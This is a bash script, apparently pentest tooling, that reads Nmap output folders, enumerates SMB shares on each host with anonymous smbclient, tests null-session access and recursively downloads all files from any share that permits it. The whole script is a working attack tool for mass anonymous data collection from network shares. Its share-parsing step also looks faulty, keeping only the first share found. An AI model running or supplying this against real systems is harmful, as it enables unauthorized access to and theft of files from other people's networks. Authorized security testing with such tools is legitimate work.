#!/bin/bash

# Base directory for the structure
base_dir="/home/kali/Documents/job/Nmap/TCP/Full"

# Check if the base directory exists
if [ ! -d "$base_dir" ]; then
    echo "Base directory not found!"
    exit 1
fi

# Service to target
target_service="netbios-ssn"

# Iterate over each IP directory
for ip_dir in "$base_dir"/*
do
    # Check if it's a directory
    if [ -d "$ip_dir" ]; then
        # Extract the IP address from the directory name
        ip=$(basename "$ip_dir" | tr '_' '.')

        # List shares using smbclient
        echo "Listing shares on $ip..."
        share_list=$(smbclient -N -L \\\\$ip | awk '/Disk|IPC/ {print $1}')

        # Check if we got any shares
        if [[ -z "$share_list" ]]; then
            echo "No shares found on $ip or access denied."
            continue
        fi

        # Convert share list into an array
        IFS=$'\n' read -r -a shares <<< "$share_list"

        # Path to the target service directory
        service_dir="$ip_dir/Discovered_Ports/$target_service"

        # Ensure the service directory exists
        mkdir -p "$service_dir"

        # Create a subdirectory named 'nullsession' within the service directory
        nullsession_dir="$service_dir/nullsession"
        mkdir -p "$nullsession_dir"

        # Attempt to create a null session for each discovered share
        for share in "${shares[@]}"; do
            echo "Testing share: $share"
            output=$(smbclient -U '%' -N \\\\$ip\\$share -c '')

            if [[ -z $output ]]; then 
                echo "[+] Creating a null session is possible for $share on $ip"
                echo "[+] Creating a null session is possible for $share on $ip" > "$nullsession_dir/nullsession_output.txt"
                
                # Create a directory to store downloaded files
                download_dir="$nullsession_dir/$share"
                mkdir -p "$download_dir"
                
                # Download all files from the share
                echo "Downloading all files from $share on $ip..."
                smbclient \\\\$ip\\$share -U '%' -N -c "prompt OFF; recurse ON; mget *; exit" -D "$download_dir"
                
                echo "Files downloaded to $download_dir"
            else
                echo $output # echo error message (e.g., NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)
                echo $output >> "$nullsession_dir/nullsession_output.txt"
            fi
        done
    fi
done

echo "Null session scan completed for $target_service on all IPs."
